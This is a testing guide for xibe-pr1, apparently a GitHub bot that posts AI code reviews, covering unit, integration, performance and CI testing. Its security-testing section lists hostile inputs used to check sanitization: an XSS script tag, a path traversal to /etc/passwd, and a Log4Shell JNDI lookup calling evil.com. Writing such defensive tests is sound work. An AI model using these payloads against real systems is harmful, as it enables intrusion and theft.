# 🧪 Testing Guide

This comprehensive testing guide covers all aspects of testing xibe-pr1, including unit tests, integration tests, end-to-end testing, performance testing, and quality assurance procedures.

## 📋 Testing Overview

xibe-pr1 includes a comprehensive test suite covering multiple aspects of the application:

```
tests/
├── 📄 test-all.js              # Complete test suite
├── 📄 test-webhook.js          # Webhook processing tests
├── 📄 test-multi-agent.js      # AI review generation tests
├── 📄 test-user-comment.js     # Comment processing tests
├── 📄 test-config.js           # Configuration validation
├── 📄 test-endpoints.js        # API endpoint tests
├── 📄 comprehensive-test.js    # Full system integration tests
└── 📁 frontend/               # Frontend component tests
```

## 🚀 Quick Start Testing

### **Run All Tests**
```bash
# Run complete test suite
npm test

# Run all tests with detailed output
npm run test:all
```

### **Individual Test Suites**
```bash
# Test webhook processing
npm run test:webhook

# Test AI review generation
npm run test:multi-agent

# Test user comment handling
npm run test:user-comment

# Test API endpoints
npm run test:endpoints

# Test configuration validation
npm run test:config
```

## 🧪 Test Categories

### **1. Configuration Tests** (`test-config.js`)

Tests environment variable configuration and validation.

```bash
# Run configuration tests
node tests/test-config.js

# Expected output:
# ✅ Environment: development
# ✅ AI Configuration: valid
# ✅ GitHub Configuration: test mode
# ✅ Redis Configuration: optional
# ✅ All configuration tests passed
```

**What it tests**:
- Environment variable presence and format
- API key validation (without exposing secrets)
- Configuration compatibility and completeness
- Development vs production settings

### **2. Webhook Tests** (`test-webhook.js`)

Tests webhook event processing and GitHub integration.

```bash
# Run webhook tests
node tests/test-webhook.js

# Expected output:
# ✅ Webhook server started on port 3000
# ✅ Testing issue_comment event...
# ✅ Bot mention detected correctly
# ✅ Webhook processing completed
# ✅ All webhook tests passed
```

**What it tests**:
- Webhook signature verification
- Event type detection and routing
- Bot mention pattern matching
- Error handling for malformed webhooks
- Rate limiting and duplicate prevention

### **3. Multi-Agent Tests** (`test-multi-agent.js`)

Tests the AI review generation and multi-agent system.

```bash
# Run multi-agent tests
node tests/test-multi-agent.js

# Expected output:
# 🤖 Starting multi-agent AI review test
# 📊 Agent 1: Analyzing files individually...
# ✅ Completed: src/auth.js
# 💬 Agent 2: Synthesizing comprehensive review...
# ✅ Final review generated successfully
# ✅ Multi-agent tests passed
```

**What it tests**:
- Individual file analysis (Agent 1)
- Review synthesis (Agent 2)
- AI model integration and fallbacks
- Review formatting and structure
- Error handling for AI API failures

### **4. API Endpoint Tests** (`test-endpoints.js`)

Tests all API endpoints and their functionality.

```bash
# Run API endpoint tests
node tests/test-endpoints.js

# Expected output:
# 🌐 Testing API endpoints...
# ✅ GET /health - 200 OK
# ✅ GET /api/status - 200 OK
# ✅ GET /api/webhooks - 200 OK
# ✅ POST /webhook - 200 OK
# ✅ All endpoint tests passed
```

**What it tests**:
- Health check endpoints
- Analytics and status endpoints
- Webhook processing endpoints
- Error handling and response codes
- Authentication and authorization

### **5. Frontend Tests** (`tests/frontend.test.js`)

Tests React components and frontend functionality.

```bash
# Run frontend tests
npm run test:frontend

# Expected output:
# ✅ Frontend build completed
# ✅ All components render correctly
# ✅ API integration working
# ✅ Responsive design validated
```

**What it tests**:
- React component rendering
- API integration and data fetching
- Responsive design breakpoints
- User interaction handling

## 🧪 Advanced Testing

### **Performance Testing**

#### **Load Testing**
```javascript
// tests/load-test.js
import { performance } from 'perf_hooks';

async function loadTest() {
  const startTime = performance.now();

  // Test multiple concurrent requests
  const promises = Array(10).fill().map(() =>
    fetch('https://your-domain.com/api/status')
  );

  await Promise.all(promises);

  const endTime = performance.now();
  console.log(`⏱️ 10 concurrent requests completed in ${endTime - startTime}ms`);
}
```

#### **Memory Usage Testing**
```javascript
// Monitor memory usage during testing
const initialMemory = process.memoryUsage();

console.log('Initial memory:', initialMemory);

// Run intensive operations
await runWebhookTests();
await runMultiAgentTests();

const finalMemory = process.memoryUsage();
console.log('Final memory:', finalMemory);
console.log('Memory increase:', finalMemory.heapUsed - initialMemory.heapUsed);
```

### **Integration Testing**

#### **End-to-End Webhook Flow**
```javascript
// tests/e2e-test.js
async function testCompleteFlow() {
  // 1. Start bot server
  const server = await startBotServer();

  // 2. Send test webhook
  const webhookResponse = await sendTestWebhook({
    event: 'issue_comment',
    action: 'created',
    comment: { body: '@test-bot please review this PR' }
  });

  // 3. Wait for processing
  await waitForProcessing(30000);

  // 4. Verify review was posted
  const reviewComment = await checkForReviewComment();

  // 5. Validate review content
  assert(reviewComment.includes('🤖 AI Code Review'));
  assert(reviewComment.includes('✅ **Recommendation**'));

  console.log('✅ End-to-end test passed');
}
```

#### **Cross-Component Testing**
```javascript
// Test interaction between components
async function testComponentIntegration() {
  // Test webhook processing → AI analysis → comment posting
  const webhookResult = await processWebhook(mockWebhook);
  const analysisResult = await generateReview(webhookResult);
  const commentResult = await postComment(analysisResult);

  assert(commentResult.success);
  assert(analysisResult.processingTime < 60000);
}
```

## 🛠️ Test Utilities

### **Mock Data Generators**

#### **Mock GitHub Webhook**
```javascript
// tests/mocks/github-webhook.js
export function createMockWebhook(overrides = {}) {
  return {
    action: 'created',
    issue: {
      number: 123,
      pull_request: {
        url: 'https://api.github.com/repos/owner/repo/pulls/123'
      }
    },
    comment: {
      id: 1234567890,
      body: '@xibe-review please review this PR',
      user: {
        login: 'testuser'
      }
    },
    repository: {
      name: 'repo',
      full_name: 'owner/repo',
      owner: {
        login: 'owner'
      }
    },
    installation: {
      id: 12345678
    },
    sender: {
      login: 'testuser'
    },
    ...overrides
  };
}
```

#### **Mock AI Response**
```javascript
// tests/mocks/ai-response.js
export function createMockAIResponse(content) {
  return {
    choices: [
      {
        message: {
          content: content,
          role: 'assistant'
        }
      }
    ],
    usage: {
      prompt_tokens: 100,
      completion_tokens: 200,
      total_tokens: 300
    }
  };
}
```

### **Test Helpers**

#### **Webhook Test Helper**
```javascript
// tests/helpers/webhook-helper.js
export class WebhookTestHelper {
  static async sendTestWebhook(webhookData) {
    return fetch('http://localhost:3000/webhook', {
      method: 'POST',
      headers: {
        'X-GitHub-Event': 'issue_comment',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(webhookData)
    });
  }

  static async waitForReview(timeout = 30000) {
    // Poll for review completion
    const startTime = Date.now();
    while (Date.now() - startTime < timeout) {
      // Check if review was posted
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
}
```

#### **Assertion Helpers**
```javascript
// tests/helpers/assertions.js
export function assertReviewStructure(review) {
  assert(review.includes('## 🤖 AI Code Review'));
  assert(review.includes('### ✅ **Recommendation**'));
  assert(review.includes('### 📋 **Summary**'));
  assert(review.includes('### 🔴 **CRITICAL ISSUES**') || review.includes('### ⚠️ **Security & Best Practices**'));
}

export function assertPerformance(executionTime, maxTime) {
  assert(executionTime < maxTime, `Execution took ${executionTime}ms, expected < ${maxTime}ms`);
}
```

## 🔄 Continuous Integration

### **GitHub Actions Configuration**
```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        node-version: [16.x, 18.x, 20.x]

    steps:
    - uses: actions/checkout@v3

    - name: Use Node.js ${{ matrix.node-version }}
      uses: actions/setup-node@v3
      with:
        node-version: ${{ matrix.node-version }}
        cache: 'npm'

    - name: Install dependencies
      run: npm ci

    - name: Run configuration tests
      run: npm run test:config

    - name: Run webhook tests
      run: npm run test:webhook

    - name: Run multi-agent tests
      run: npm run test:multi-agent

    - name: Run API endpoint tests
      run: npm run test:endpoints

    - name: Run frontend tests
      run: npm run test:frontend

    - name: Upload coverage reports
      uses: codecov/codecov-action@v3
```

### **Automated Testing Pipeline**
```bash
# Pre-deployment testing
npm run test:config      # Configuration validation
npm run test:webhook     # Webhook functionality
npm run test:multi-agent # AI integration
npm run test:endpoints   # API reliability
npm run test:frontend    # UI functionality

# Only deploy if all tests pass
if [ $? -eq 0 ]; then
  echo "✅ All tests passed - deploying..."
  npm run deploy
else
  echo "❌ Tests failed - aborting deployment"
  exit 1
fi
```

## 📊 Test Coverage

### **Coverage Requirements**
```json
{
  "statements": 80,
  "branches": 75,
  "functions": 80,
  "lines": 80
}
```

### **Coverage Report**
```bash
# Generate coverage report
npm run test:coverage

# Expected output:
# Statements   : 85.2% ( 340/399 )
# Branches     : 78.5% ( 62/79 )
# Functions    : 82.1% ( 92/112 )
# Lines        : 85.2% ( 340/399 )
```

### **Coverage Analysis**
```bash
# Check which lines are not covered
npm run test:coverage -- --reporter=lcov

# Generate HTML coverage report
npm run test:coverage -- --reporter=html

# Open coverage report
open coverage/lcov-report/index.html
```

## 🐛 Manual Testing

### **Webhook Testing**

#### **Test with Real GitHub Events**
1. **Create Test Repository**: Set up a test repository for testing
2. **Install Webhook**: Configure webhook to point to your test instance
3. **Trigger Events**: Create PRs and comments to test webhook processing
4. **Monitor Logs**: Watch real-time processing in logs

#### **Local Webhook Testing**
```bash
# Use ngrok for local webhook testing
ngrok http 3000

# Update webhook URL in GitHub to ngrok URL
# https://abc123.ngrok.io/webhook

# Test with real GitHub events
# Create PR and comment: @xibe-review please review this PR
```

### **AI Testing**

#### **Review Quality Testing**
1. **Create Test PRs**: With known issues (security vulnerabilities, code smells)
2. **Trigger Reviews**: Use bot to review test PRs
3. **Validate Output**: Check that bot correctly identifies issues
4. **Measure Accuracy**: Compare bot findings with manual review

#### **Performance Testing**
```bash
# Test response times for different PR sizes
echo "Testing small PR..." && time node test-small-pr.js
echo "Testing medium PR..." && time node test-medium-pr.js
echo "Testing large PR..." && time node test-large-pr.js
```

### **Integration Testing**

#### **Full System Test**
```bash
# Comprehensive system test
node tests/comprehensive-test.js

# Should test:
# ✅ Webhook reception and processing
# ✅ Authentication (both modes)
# ✅ AI review generation
# ✅ Comment posting
# ✅ Analytics recording
# ✅ Error handling
# ✅ Performance metrics
```

## 🔧 Test Configuration

### **Environment Setup for Testing**
```env
# tests/.env.test
NODE_ENV=test
LOG_LEVEL=debug

# Test mode (no GitHub auth needed)
AI_API=https://api.openai.com/v1
AI_KEY=sk-your-test-key

# Mock GitHub responses
GITHUB_MOCK_MODE=true

# Test Redis (optional)
UPSTASH_REDIS_REST_URL=https://test-redis.upstash.io
UPSTASH_REDIS_REST_TOKEN=test_token
```

### **Test Database Setup**
```javascript
// tests/setup.js
export async function setupTestEnvironment() {
  // Clear test data
  await redis.flushdb();

  // Set up test configuration
  process.env.NODE_ENV = 'test';
  process.env.GITHUB_MOCK_MODE = 'true';

  // Initialize test services
  await startMockGitHubServer();
  await startMockAIServer();
}
```

## 📈 Performance Testing

### **Response Time Benchmarks**
```javascript
// tests/performance-test.js
const benchmarks = {
  smallPR: { files: 1, lines: 50, maxTime: 20000 },    // 20 seconds
  mediumPR: { files: 5, lines: 200, maxTime: 40000 },  // 40 seconds
  largePR: { files: 15, lines: 500, maxTime: 90000 }   // 90 seconds
};

export async function performanceTest(prSize) {
  const benchmark = benchmarks[prSize];
  const startTime = Date.now();

  // Run review process
  await generateReview(createMockPR(benchmark));

  const endTime = Date.now();
  const actualTime = endTime - startTime;

  console.log(`${prSize} PR review time: ${actualTime}ms`);

  if (actualTime > benchmark.maxTime) {
    throw new Error(`Performance regression: ${actualTime}ms > ${benchmark.maxTime}ms`);
  }
}
```

### **Load Testing**
```javascript
// tests/load-test.js
export async function loadTest(concurrentUsers = 10) {
  console.log(`🚀 Starting load test with ${concurrentUsers} concurrent users`);

  const startTime = Date.now();
  const promises = [];

  // Create concurrent review requests
  for (let i = 0; i < concurrentUsers; i++) {
    promises.push(
      generateReview(createMockPR({ files: 3, lines: 100 }))
    );
  }

  // Wait for all reviews to complete
  await Promise.all(promises);

  const endTime = Date.now();
  const totalTime = endTime - startTime;
  const avgTime = totalTime / concurrentUsers;

  console.log(`✅ Load test completed:`);
  console.log(`   Total time: ${totalTime}ms`);
  console.log(`   Average time per review: ${avgTime}ms`);
  console.log(`   Reviews per second: ${(concurrentUsers / totalTime) * 1000}`);
}
```

### **Memory Usage Testing**
```javascript
// tests/memory-test.js
export function monitorMemoryUsage() {
  const initialMemory = process.memoryUsage();

  return {
    start: initialMemory,
    check() {
      const currentMemory = process.memoryUsage();
      const increase = {
        rss: currentMemory.rss - initialMemory.rss,
        heapUsed: currentMemory.heapUsed - initialMemory.heapUsed,
        heapTotal: currentMemory.heapTotal - initialMemory.heapTotal
      };
      return increase;
    }
  };
}

async function memoryTest() {
  const monitor = monitorMemoryUsage();

  // Run intensive operations
  await loadTest(50);

  const memoryIncrease = monitor.check();
  console.log('Memory increase:', memoryIncrease);

  // Check for memory leaks
  if (memoryIncrease.heapUsed > 100 * 1024 * 1024) { // 100MB
    throw new Error('Potential memory leak detected');
  }
}
```

## 🛡️ Security Testing

### **Input Validation Testing**
```javascript
// tests/security-test.js
const maliciousInputs = [
  '<script>alert("xss")</script>',
  '../../../etc/passwd',
  '${jndi:ldap://evil.com/a}',
  'javascript:alert(1)',
  '\x00\x01\x02', // Binary data
  'VERY_LONG_STRING_'.repeat(1000) // Buffer overflow attempt
];

export async function securityTest() {
  for (const input of maliciousInputs) {
    const sanitized = sanitizeInput(input);

    // Verify input is properly sanitized
    assert(!sanitized.includes('<script>'));
    assert(!sanitized.includes('../'));
    assert(sanitized.length < 10000); // Prevent DoS
  }
}
```

### **Authentication Testing**
```javascript
// tests/auth-test.js
export async function testAuthentication() {
  // Test with invalid GitHub App credentials
  process.env.GITHUB_APP_ID = 'invalid';
  process.env.GITHUB_PRIVATE_KEY = 'invalid';

  const result = await processWebhook(mockWebhook);
  assert(result.error.includes('authentication'));

  // Test with valid credentials
  process.env.GITHUB_APP_ID = 'valid_id';
  process.env.GITHUB_PRIVATE_KEY = 'valid_key';

  const result2 = await processWebhook(mockWebhook);
  assert(result2.success);
}
```

## 🔍 Debugging Tests

### **Test Debugging Tools**

#### **Interactive Test Debugger**
```bash
# Run tests with Node.js inspector
node --inspect tests/test-webhook.js

# Use Chrome DevTools for debugging
# Open chrome://inspect
# Click "Open dedicated DevTools for Node"
```

#### **Verbose Test Output**
```bash
# Enable detailed test logging
DEBUG=test node tests/test-webhook.js

# Capture test output for analysis
node tests/test-webhook.js 2>&1 | tee test-output.log
```

### **Test Data Analysis**

#### **Performance Analysis**
```bash
# Analyze test performance
node tests/performance-test.js | grep "time:" | awk '{print $3}' | sort -n

# Find slowest tests
node tests/performance-test.js 2>&1 | grep "FAIL\|time:" | grep -A1 "FAIL"
```

#### **Coverage Analysis**
```bash
# Find uncovered code
npm run test:coverage
open coverage/lcov-report/index.html

# Check specific file coverage
npm run test:coverage -- --reporter=json | jq '.files | to_entries[] | select(.value.lines.pct < 80) | .key'
```

## 📋 Test Results

### **Expected Test Results**
```bash
$ npm test
✅ Configuration tests: 15/15 passed
✅ Webhook tests: 8/8 passed
✅ Multi-agent tests: 6/6 passed
✅ API endpoint tests: 12/12 passed
✅ Frontend tests: 20/20 passed

🎉 All tests passed! (61/61)
```

### **Test Report Generation**
```bash
# Generate detailed test report
node tests/generate-report.js

# Output:
# 📊 Test Report Generated: reports/test-report-2024-01-15.html
# ✅ Total Tests: 61
# ✅ Passed: 61 (100%)
# ❌ Failed: 0 (0%)
# ⏱️ Total Time: 45.2s
# 📈 Performance: Good
```

### **Historical Test Results**
```bash
# Track test results over time
echo "$(date), $(npm test | grep "passed\|failed")" >> test-history.log

# View trends
cat test-history.log | grep "100%" | wc -l  # Count successful runs
```

## 🚨 Test Failure Handling

### **Common Test Failures**

#### **Configuration Failures**
```bash
# Missing environment variables
❌ Error: AI_API must be set in environment variables

# Solution:
cp .env.example .env
nano .env  # Add required variables
```

#### **Network Failures**
```bash
# API connectivity issues
❌ Error: Connection timeout to api.openai.com

# Solution:
# Check network connectivity
curl -I https://api.openai.com/v1/models

# Verify API key
curl -H "Authorization: Bearer $AI_KEY" https://api.openai.com/v1/models
```

#### **Authentication Failures**
```bash
# GitHub API issues
❌ Error: GitHub API authentication failed

# Solution:
# Check GitHub token/app configuration
node -e "console.log('Token:', process.env.GITHUB_TOKEN ? 'Set' : 'Missing')"
node -e "console.log('App ID:', process.env.GITHUB_APP_ID)"
```

### **Test Retry Logic**
```javascript
// Automatic retry for flaky tests
export async function retryTest(testFunction, maxRetries = 3) {
  for (let i = 1; i <= maxRetries; i++) {
    try {
      return await testFunction();
    } catch (error) {
      if (i === maxRetries) throw error;

      console.log(`Test failed (attempt ${i}/${maxRetries}), retrying...`);
      await new Promise(resolve => setTimeout(resolve, 1000 * i));
    }
  }
}
```

## 📊 Quality Assurance

### **Code Quality Testing**
```bash
# ESLint for code quality
npm run lint

# TypeScript type checking
npx tsc --noEmit

# Security scanning
npm audit

# Dependency vulnerabilities
npm audit fix
```

### **Performance Testing**
```bash
# Bundle size analysis
npm run build
du -sh dist/assets/*.js

# Lighthouse performance testing
npm run lighthouse

# Web vitals testing
npm run web-vitals
```

### **Accessibility Testing**
```bash
# Automated accessibility testing
npm run test:a11y

# Manual accessibility review
# Check color contrast, keyboard navigation, screen reader compatibility
```

## 🔄 Test Automation

### **Scheduled Test Runs**
```yaml
# GitHub Actions for nightly tests
name: Nightly Tests
on:
  schedule:
    - cron: '0 2 * * *'  # Run at 2 AM UTC daily

jobs:
  nightly-tests:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - uses: actions/setup-node@v3
      with:
        node-version: '18'
        cache: 'npm'
    - run: npm ci
    - run: npm run test:all
    - run: npm run test:coverage
    - uses: codecov/codecov-action@v3
```

### **Pre-deployment Testing**
```yaml
# Test before every deployment
name: Pre-deployment Tests
on:
  push:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - uses: actions/setup-node@v3
      with:
        node-version: '18'
        cache: 'npm'
    - run: npm ci
    - run: npm run test:config
    - run: npm run test:webhook
    - run: npm run test:multi-agent
    - run: npm run test:endpoints
```

---

This comprehensive testing framework ensures xibe-pr1 maintains high quality, reliability, and performance across all deployment scenarios and usage patterns.
